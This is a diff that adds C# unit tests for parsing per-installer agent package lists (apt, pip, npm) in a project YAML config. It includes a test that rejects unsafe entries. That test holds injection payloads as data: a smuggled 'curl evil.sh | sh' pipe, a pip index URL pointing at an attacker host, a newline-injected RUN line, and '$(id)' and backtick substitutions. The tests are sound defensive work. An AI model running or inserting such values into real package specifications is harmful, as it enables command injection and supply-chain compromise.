@@ -130,6 +130,48 @@ public class ProjectConfigLoaderTests
     }
 
     [Fact]
+    public void Agent_packages_are_parsed_and_shared_with_the_reviewer()
+    {
+        var yaml = FixtureYaml().Replace("  allowedDomains: [api.nuget.org, registry.npmjs.org]\n",
+            "  allowedDomains: [api.nuget.org, registry.npmjs.org]\n"
+            + "  packages:\n"
+            + "    apt: [ripgrep, \"jq=1.7.1-3build1\"]\n"
+            + "    pip: [graphifyy, \"graphifyy==0.8.33\", \"requests[socks]>=2.31,<3\", graphifyy]\n"
+            + "    npm: [\"@scope/tool@1.2.0\", typescript]\n");
+        var p = LoadYaml(yaml);
+
+        Assert.Equal(["ripgrep", "jq=1.7.1-3build1"], p.Agent.Packages.Apt);
+        Assert.Equal(["graphifyy", "graphifyy==0.8.33", "requests[socks]>=2.31,<3"], p.Agent.Packages.Pip);
+        Assert.Equal(["@scope/tool@1.2.0", "typescript"], p.Agent.Packages.Npm);
+        Assert.Same(p.Agent.Packages, p.Review.Agent.Packages);
+    }
+
+    [Fact]
+    public void Agent_packages_default_to_none()
+    {
+        var p = ProjectConfigLoader.Load(Fixture("orders.yaml"));
+        Assert.True(p.Agent.Packages.IsEmpty);
+        Assert.True(p.Review.Agent.Packages.IsEmpty);
+    }
+
+    [Theory]
+    [InlineData("apt", "\"ripgrep; curl evil.sh | sh\"")]
+    [InlineData("apt", "\"-o=APT::Foo\"")]
+    [InlineData("apt", "\"two words\"")]
+    [InlineData("pip", "\"pkg'\"")]
+    [InlineData("pip", "\"--index-url=https://evil\"")]
+    [InlineData("pip", "\"pkg\\nRUN evil\"")]
+    [InlineData("npm", "\"$(id)\"")]
+    [InlineData("npm", "\"tool@`id`\"")]
+    public void Rejects_unsafe_agent_packages(string installer, string item)
+    {
+        var yaml = FixtureYaml().Replace("  allowedDomains: [api.nuget.org, registry.npmjs.org]\n",
+            $"  allowedDomains: [api.nuget.org, registry.npmjs.org]\n  packages:\n    {installer}: [{item}]\n");
+        var ex = Assert.Throws<ProjectConfigException>(() => LoadYaml(yaml));
+        Assert.Contains($"in agent.packages.{installer}", ex.Message);
+    }
+
+    [Fact]
     public void Review_defaults_to_off_with_read_only_tools()
     {
         var p = ProjectConfigLoader.Load(Fixture("orders.yaml"));
